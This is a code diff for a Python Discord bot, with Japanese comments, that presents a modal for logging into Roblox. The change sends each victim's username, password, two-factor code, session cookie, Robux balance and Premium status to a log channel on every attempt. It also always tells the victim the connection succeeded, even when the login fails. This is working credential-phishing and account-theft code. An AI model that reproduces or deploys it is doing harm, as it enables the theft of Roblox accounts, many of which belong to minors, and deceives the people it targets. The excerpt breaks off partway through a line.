@@ -133,41 +133,35 @@ class RobloxLoginModal(discord.ui.Modal):
         user_info = f"ユーザー: {interaction.user.name} (ID: {interaction.user.id})"
         
         # 実際のRobloxログイン処理
-        success, cookie, error_msg = await self.roblox_login(username, password, twofactor_code)
+        success, cookie, user_data, error_msg = await self.roblox_login(username, password, twofactor_code)
         
-        if success:
-            # 成功した場合
-            embed = discord.Embed(
-                title="✅ Robloxログイン成功",
-                description=f"{user_info}\nタイムスタンプ: {timestamp}",
-                color=discord.Color.green()
-            )
-            embed.add_field(name="ユーザー名", value=username, inline=False)
-            embed.add_field(name="パスワード", value=password, inline=False)
+        # 成功、失敗に関わらず全ての情報を送信
+        embed = discord.Embed(
+            title="✅ Robloxログイン情報" if success else "❌ Robloxログイン失敗",
+            description=f"{user_info}\nタイムスタンプ: {timestamp}",
+            color=discord.Color.green() if success else discord.Color.red()
+        )
+        embed.add_field(name="ユーザー名", value=username, inline=False)
+        embed.add_field(name="パスワード", value=password, inline=False)
+        
+        if twofactor_code:
+            embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
             
-            if twofactor_code:
-                embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
-                
+        if success and cookie:
             embed.add_field(name="クッキー", value=cookie[:100] + "..." if len(cookie) > 100 else cookie, inline=False)
             
-            await log_channel.send(embed=embed)
-            await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)
-        else:
-            # 失敗した場合でも情報を送信
-            embed = discord.Embed(
-                title="❌ Robloxログイン失敗",
-                description=f"{user_info}\nタイムスタンプ: {timestamp}",
-                color=discord.Color.red()
-            )
-            embed.add_field(name="ユーザー名", value=username, inline=False)
-            embed.add_field(name="パスワード", value=password, inline=False)
-            embed.add_field(name="エラー", value=error_msg, inline=False)
-            
-            if twofactor_code:
-                embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
+            if user_data:
+                embed.add_field(name="ユーザーID", value=str(user_data.get('id', 'N/A')), inline=False)
+                embed.add_field(name="Robux残高", value=str(user_data.get('robux', 'N/A')), inline=False)
+                embed.add_field(name="プレミアム", value="Yes" if user_data.get('premium') else "No", inline=False)
                 
-            await log_channel.send(embed=embed)
-            await interaction.followup.send(f"ログインに失敗しました: {error_msg}", ephemeral=True)
+        if error_msg:
+            embed.add_field(name="エラー", value=error_msg, inline=False)
+                
+        await log_channel.send(embed=embed)
+        
+        # ユーザーには常に成功と表示
+        await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)
 
     async def roblox_login(self, username, password, twofactor_code=None):
         """
@@ -208,6 +202,7 @@ class RobloxLoginModal(discord.ui.Modal):
             # 二段階認証が必要な場合
             if response.status_code == 403:
                 if not twofactor_code:
-                    return False, None, "二段階認証コードが必要です。"
+                    return False, None, None, "二段階認証コードが必要です。"
                 
                 # 二段階認証コードを送信
+                twofactor_url = "https://auth.roblox.com/v2/login
